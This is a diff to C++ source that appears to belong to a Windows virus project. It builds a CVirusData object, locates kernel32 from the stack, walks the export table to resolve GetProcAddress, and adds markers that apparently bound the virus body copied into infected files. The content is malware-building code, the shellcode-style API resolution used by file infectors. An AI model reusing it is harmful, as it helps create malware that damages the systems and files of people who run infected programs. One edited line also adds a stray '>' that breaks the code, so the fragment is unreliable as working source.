@@ -4,6 +4,7 @@
 
 TYPE_SIZE getEIP();
 void start();
+TYPE_SIZE MARKER_BODYEND();
 
 //====================================================================================================
 int main() {
@@ -69,6 +70,10 @@ void start() {
 	TYPE_SIZE stackIter[1] = {0};//TODO remove unnecessary initializer
 	CVirusData dataObject;
 
+	MARKER_BODYBEGIN();
+	MARKER_MARKEREXAMPLE();
+	MARKER_BODYEND();
+
 	//Get addr somewhere in kernel32 from stack
 	auto addrSomewhereInKernel32 = stackIter[4]; //TODO what the fuck is going here - addrSomewhereInKernel32 sometimes invalid
 	//Get kernel32 base addr
@@ -84,11 +89,12 @@ void start() {
 	auto imageDataDirExportAddr = ((IMAGE_OPTIONAL_HEADER*)OptionalPEHeaderAddr)->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+kernel32Addr;
 	auto pExportFuncsNames = ((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfNames + kernel32Addr;
 
-	TYPE_SIZE i = 0;
+	TYPE_SIZE i = 0;>
 	do{
 		auto curFuncNameAddr = kernel32Addr + ((TYPE_SIZE*)pExportFuncsNames)[i];
 		if (strcmp((TYPE_BYTE*)curFuncNameAddr, (TYPE_BYTE*)dataObject.funcname_GetProcAddress) == true) { break; }
 	} while (++i);
+
 	auto getProcAddrOrdinal = ((TYPE_WORD*)(((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfNameOrdinals + kernel32Addr))[i];
 	dataObject.addr_GetProcAddress = (decltype(dataObject.addr_GetProcAddress))((unsigned)((TYPE_SIZE*)( ((IMAGE_EXPORT_DIRECTORY*)imageDataDirExportAddr)->AddressOfFunctions + kernel32Addr) )[getProcAddrOrdinal]+kernel32Addr);
 	
